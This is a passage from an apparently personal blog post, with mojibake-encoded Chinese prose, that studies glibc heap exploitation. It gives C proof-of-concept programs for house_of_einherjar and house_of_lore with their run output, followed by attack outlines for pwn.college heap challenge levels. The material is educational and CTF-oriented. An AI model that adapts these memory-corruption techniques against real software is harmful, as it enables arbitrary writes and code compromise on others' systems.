class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *c;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_header;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_mem;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_chunk_header = a;          <span class="comment">//consruct a fake chunk inside chunk a&#x27;s memory</span></span><br><span class="line">    fake_chunk_header[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">1</span>] = <span class="number">0x130</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">2</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_header[<span class="number">3</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_mem = fake_chunk_header + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0x30</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = <span class="number">0x130</span>;         <span class="comment">//fake_c_prevsize</span></span><br><span class="line">    <span class="type">char</span> * size_ptr = &amp;b[<span class="number">0x38</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]; </span><br><span class="line">    *size_ptr= <span class="number">0</span>;     <span class="comment">//off by one</span></span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x220</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem: %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    assert(target == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_einherjar.c -o house_of_einherjar -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_einherjar</span><br><span class="line">target: 0x5591c4d6f9b0</span><br><span class="line">fake_chunk_mem: 0x5591c4d6f9b0</span><br></pre></td></tr></table></figure>
<h3 id="smallbins">smallbins</h3>
<h4 id="house_of_lore">house_of_lore</h4>
<p>æ”»å‡»å‡è®¾:å¯¹é‡Šæ”¾è¿›å…¥<code>smallbins</code>ä¸­çš„å †å—æœ‰<code>UAF</code>,èƒ½å¤Ÿä¿®æ”¹å…¶<code>bk</code>æŒ‡é’ˆ</p>
<p>1.é‡Šæ”¾ä¸€ä¸ªå †å—<code>victim</code>è¿›å…¥<code>smallbins</code></p>
<p>2.å¯¹<code>victim</code>è¿›è¡Œ<code>UAF</code>,ä¿®æ”¹å…¶<code>bk</code>æŒ‡é’ˆæŒ‡å‘<code>a</code>å †å—</p>
<p>3.<code>a</code>å‰ä¸<code>victim</code>ç›¸è¿,åä¸<code>b</code>ç›¸è¿</p>
<p>4.<code>b</code>åé¢åªä½¿ç”¨<code>bk</code>æŒ‡é’ˆæŒ‚äº†ä¸€ä¸²å †å—(èƒ½å¤Ÿå¡«æ»¡<code>tcahe</code>)</p>
<p>5.æ¸…ç©º<code>tcache</code>ç„¶å<code>malloc</code>,å¯¼è‡´<code>a</code>,<code>b</code>ä»¥åŠä¸€è¿ä¸²æ‹–å®¶å¸¦å£è¿›å…¥<code>tcache</code></p>
<p>6.æ­¤åä»<code>tcache</code>ä¸­åˆ†é…å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>ç”»ä¸ªå›¾æ„æ€æ„æ€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241105134342656.png"
alt="house_of_lore" />
<figcaption aria-hidden="true">house_of_lore</figcaption>
</figure>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> *fd;</span><br><span class="line">    <span class="type">size_t</span> *bk;</span><br><span class="line">&#125;BinChunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *victim_header;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    BinChunk a;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk b;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk fake_freelist[<span class="number">7</span>];		<span class="comment">//on stack</span></span><br><span class="line">    <span class="type">size_t</span> * target;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        fake_freelist[i].bk = &amp;fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">    &#125;       <span class="comment">//fake_freelist[0] =&gt; fake_freelist[1] =&gt; fake_freelist[2] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    victim_header = (<span class="type">char</span>*)victim - <span class="number">0x10</span>;</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(victim);           <span class="comment">//now victim is in unsorted bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);         <span class="comment">//sort victim into smallbin</span></span><br><span class="line">    <span class="comment">//suppose we have UAF to modify victim.bk points to a</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line">    victim[<span class="number">1</span>] = &amp;a; <span class="comment">//UAF</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    a.fd = victim_header;</span><br><span class="line">    a.bk = &amp;b;</span><br><span class="line">    b.fd = &amp;a;</span><br><span class="line">    b.bk = &amp;fake_freelist[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// smallbins[idx] =&gt; victim &lt;=&gt; a &lt;=&gt; b =&gt; fake_freelist[0] =&gt; fake_freelist[1] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);   <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//get victim again and use smallbins to fill tcache</span></span><br><span class="line">    <span class="comment">//tcache[idx] =&gt; fake_freelist[4] =&gt; fake_freelist[3] =&gt; fake_freelist[2] =&gt; fake_freelist[1] =&gt; fake_freelist[0] =&gt;b =&gt;a</span></span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//fetch fake_freelist[4] from tcache</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target = %p\n&quot;</span>,target);</span><br><span class="line">    assert(target == &amp;fake_freelist[<span class="number">4</span>].fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_lore.c -o house_of_lore -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_lore</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">target = 0x7ffd93539ed0</span><br></pre></td></tr></table></figure>
<h2 id="pwn.college">pwn.college</h2>
<h3 id="level1.0">level1.0</h3>
<p>æ”»å‡»å‡è®¾:</p>
<p>0.åªæœ‰<code>malloc</code>,æ²¡æœ‰<code>calloc</code></p>
<p>1.æœ€å¤šæŒæœ‰16ä¸ªå †å—æŒ‡é’ˆ,å¯ä»¥å¡«å……<code>tcache</code></p>
<p>2.<code>free</code>ä¹‹åä¸æ¸…ç©ºæŒ‡é’ˆ,å¯ä»¥<code>UAF</code></p>
<p>å¯ä»¥è€ƒè™‘ <code>fastbin_dup_with_consolidate</code>çš„æ€è·¯</p>
<p>0.å¡«å……tcache</p>
<p>1.æ‰¾ä¸€ä¸ªä¸topchunkç›¸é‚»çš„å°å †å—,freeè¿›å…¥fastbins</p>
<p>2.read_flagå‘èµ·0x52Aå­—èŠ‚çš„åˆ†é…è¯·æ±‚,åˆå¹¶fastbinså †å—åˆ°topchunk,å¹¶æ‹¿åˆ°flag_chunk</p>
<p>3.ç›´æ¥ä»å°å †å—ä¸ŠUAF,putså³å¯æ³„éœ²flag</p>
<h3 id="level2">level2</h3>
<p>æ”»å‡»å‡è®¾:</p>
<p>0.æœ‰mallocä¹Ÿæœ‰calloc, mallocæœ€å¤§0x420, callocæ— é™åˆ¶</p>
<p>1.freeä¸æ¸…ç©ºæŒ‡é’ˆ,UAF</p>
<ol start="2" type="1">
<li></li>
</ol>
<h3 id="level4.0">level4.0</h3>
<p>æœ€å°3000å­—èŠ‚çš„å †å—</p>
<p>åªèƒ½è€ƒè™‘largebinså’Œunsortedbinçš„åˆ©ç”¨æ–¹æ³•</p>
<p>ç›®æ ‡æ˜¯å°†<code>authenticated @ 0x4041C0</code>å†™ä¸Šä»»æ„å€¼</p>
<p>æ­¥éª¤:</p>
<p>å¤§äº3000å­—èŠ‚çš„largebin,æ¯”å¦‚<code>0xbc0-0xbf0</code></p>
<p>å¯ä»¥ç”³è¯·0xbd0,0xbe0</p>
<p>1.A = malloc(0xbe0)</p>
<p>barrier</p>
<p>2.B = malloc(0xbe0)</p>
<p>barrier</p>
<p>3.C = malloc(0xbd0)</p>
<p>barrier</p>
<p>3.free(A),free(B)è¿›å…¥largebin,UAFæ³„éœ²binåœ°å€å’Œå †å—åœ°å€</p>
<p>4.malloc(0xbe0)æ‹¿ä¸€ä¸ªå‡ºæ¥,å‰©ä¸‹ä¸€ä¸ª</p>
<p>5.UAFå°†authenticatedæŒ‚åˆ°bk_nextsizeä¸Š</p>
<p>6.free(C)</p>
<h3 id="level5.0">level5.0</h3>
<p>æœ‰è¶Šç•Œå†™</p>
<p>1.UAFæ³„éœ²å †å—åŸºåœ°å€</p>
<p>2.æ ¹æ®ç›¸å¯¹åç§»é‡è®¡ç®—å¾—åˆ°flag_chunkçš„åœ°å€</p>
<p>å¦‚ä½•å°†alloc_structæ”¾åˆ°å †å—é‡Œ?</p>
<h3 id="level6.0">level6.0</h3>
<h3 id="level7.0">level7.0</h3>
<p>ç¦ç”¨tcache</p>
<p>æ³„éœ²flagåœ°å€</p>
<p>fastbinåˆ©ç”¨,æœ‰UAF,</p>
<h3 id="level8.0">level8.0</h3>
<p>æœ€å¤§ç”³è¯·0x1000</p>
<p>å †é£æ°´:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">A</span><br><span class="line">----------------</span><br><span class="line">flag</span><br><span class="line">----------------</span><br><span class="line">B</span><br><span class="line">----------------</span><br><span class="line">C</span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>1.é€šè¿‡Bæ„é€ <code>C-&gt;prev_size</code>å¹¶é€šè¿‡<code>off-by-one</code>å°†<code>C-&gt;prev_in_use</code>
å½’0</p>
<p>2.åœ¨Aä¸­æ„é€ å‡çš„å †å—å¤´,è¿™éœ€è¦è®¾ç½®<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆ</p>
<p>3.<code>free C</code>,å‘å‰åˆå¹¶åˆ°<code>A</code></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/heap/" rel="tag"># heap</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/10/17/T%E6%93%A6%E8%BD%A6/" rel="prev" title="tcache">
      <i class="fa fa-chevron-left"></i> tcache
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/11/26/kernel%20rop/" rel="next" title="kernel rop">
      kernel rop <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84%E6%96%8C"><span class="nav-number">1.</span> <span class="nav-text">çœ‹çœ‹ä½ çš„æ–Œ</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%888%E6%97%A5%E7%9A%84%E6%A2%A6"><span class="nav-number">1.1.</span> <span class="nav-text">11æœˆ8æ—¥çš„æ¢¦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%8C%E5%AE%B6%E3%81%AE%E6%95%85%E4%BA%8B"><span class="nav-number">1.2.</span> <span class="nav-text">æ–Œå®¶ã®æ•…äº‹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meta-meta-data"><span class="nav-number">1.3.</span> <span class="nav-text">meta-meta-data</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc_state"><span class="nav-number">1.3.1.</span> <span class="nav-text">malloc_state</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc_par"><span class="nav-number">1.3.2.</span> <span class="nav-text">malloc_par</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%8Cs"><span class="nav-number">1.4.</span> <span class="nav-text">æ–Œs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#topchunk"><span class="nav-number">1.4.1.</span> <span class="nav-text">Topchunk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">algorithm</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%AB%E6%96%8Cfastbins"><span class="nav-number">1.4.2.</span> <span class="nav-text">å¿«æ–ŒFastbins</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datastructure"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">datastructure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm-1"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#free"><span class="nav-number">1.4.2.2.1.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc"><span class="nav-number">1.4.2.2.2.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc_consolidate"><span class="nav-number">1.4.2.2.3.</span> <span class="nav-text">malloc_consolidate</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E6%96%8Csmallbins"><span class="nav-number">1.4.3.</span> <span class="nav-text">å°æ–ŒSmallbins</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datastructure-1"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">datastructure</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm-2"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc-1"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">malloc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%B1%E6%96%8Cunsortedbin"><span class="nav-number">1.4.4.</span> <span class="nav-text">ä¹±æ–ŒUnsortedbin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm-3"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#free-1"><span class="nav-number">1.4.4.1.1.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#malloc-2"><span class="nav-number">1.4.4.1.2.</span> <span class="nav-text">malloc</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exploit"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#overlap"><span class="nav-number">1.4.4.2.1.</span> <span class="nav-text">overlap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E6%96%8Clargebins"><span class="nav-number">1.4.5.</span> <span class="nav-text">å¤§æ–ŒLargebins</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#datastructure-2"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">datastructure</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8"><span class="nav-number">1.4.5.1.1.</span> <span class="nav-text">åŒå‘é“¾è¡¨</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%B3%E8%A1%A8%E7%B4%A2%E5%BC%95"><span class="nav-number">1.4.5.1.2.</span> <span class="nav-text">è·³è¡¨ç´¢å¼•</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%93%BE%E8%A1%A8%E8%B7%B3%E8%A1%A8"><span class="nav-number">1.4.5.1.3.</span> <span class="nav-text">é“¾è¡¨+è·³è¡¨</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#binmap"><span class="nav-number">1.4.5.1.4.</span> <span class="nav-text">binmap</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#algorithm-4"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">algorithm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E6%9B%B4%E5%B0%8F%E7%9A%84%E5%A0%86%E5%9D%97"><span class="nav-number">1.4.5.2.1.</span> <span class="nav-text">æ’å…¥æ›´å°çš„å †å—</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E5%B7%B2%E6%9C%89%E7%B4%A2%E5%BC%95%E7%9A%84%E5%A0%86%E5%9D%97"><span class="nav-number">1.4.5.2.2.</span> <span class="nav-text">æ’å…¥å·²æœ‰ç´¢å¼•çš„å †å—</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E5%A0%86%E5%9D%97"><span class="nav-number">1.4.5.2.3.</span> <span class="nav-text">æ’å…¥ä¸å­˜åœ¨ç´¢å¼•çš„å †å—</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%93%E5%89%8Dbin%E4%B8%AD%E6%9C%89%E5%A0%86%E5%9D%97%E6%97%B6%E6%8B%BF%E8%B5%B0%E4%B8%80%E4%B8%AA"><span class="nav-number">1.4.5.2.4.</span> <span class="nav-text">å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%93%E5%89%8Dbin%E4%B8%AD%E6%B2%A1%E6%9C%89%E5%A0%86%E5%9D%97%E6%97%B6%E6%8B%BF%E8%B5%B0%E4%B8%80%E4%B8%AA"><span class="nav-number">1.4.5.2.5.</span> <span class="nav-text">å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9C%BA%E6%99%AF"><span class="nav-number">1.5.</span> <span class="nav-text">å¤šçº¿ç¨‹åœºæ™¯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#free-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">malloc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit-1"><span class="nav-number">1.6.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbins"><span class="nav-number">1.6.1.</span> <span class="nav-text">fastbins</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#double-free-dup"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">double free dup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#poison"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">poison</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dup_with_consolidate"><span class="nav-number">1.6.1.3.</span> <span class="nav-text">dup_with_consolidate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reverse_into_tcache"><span class="nav-number">1.6.1.4.</span> <span class="nav-text">reverse_into_tcache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#house_of_mind"><span class="nav-number">1.6.1.5.</span> <span class="nav-text">house_of_mind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#house_of_spirit"><span class="nav-number">1.6.1.6.</span> <span class="nav-text">house_of_spirit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#largebins"><span class="nav-number">1.6.2.</span> <span class="nav-text">largebins</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%90%88%E6%B3%95%E5%9C%B0%E5%9D%80%E5%86%99%E5%A0%86%E5%9D%97%E5%9C%B0%E5%9D%80"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">ä»»æ„åˆæ³•åœ°å€å†™å †å—åœ°å€</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unsortedbin"><span class="nav-number">1.6.3.</span> <span class="nav-text">unsortedbin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#house_of_botcake"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">house_of_botcake</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#house_of_einherjar"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">house_of_einherjar</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smallbins"><span class="nav-number">1.6.4.</span> <span class="nav-text">smallbins</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#house_of_lore"><span class="nav-number">1.6.4.1.</span> <span class="nav-text">house_of_lore</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn.college"><span class="nav-number">1.7.</span> <span class="nav-text">pwn.college</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1.0"><span class="nav-number">1.7.1.</span> <span class="nav-text">level1.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">1.7.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4.0"><span class="nav-number">1.7.3.</span> <span class="nav-text">level4.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5.0"><span class="nav-number">1.7.4.</span> <span class="nav-text">level5.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level6.0"><span class="nav-number">1.7.5.</span> <span class="nav-text">level6.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7.0"><span class="nav-number">1.7.6.</span> <span 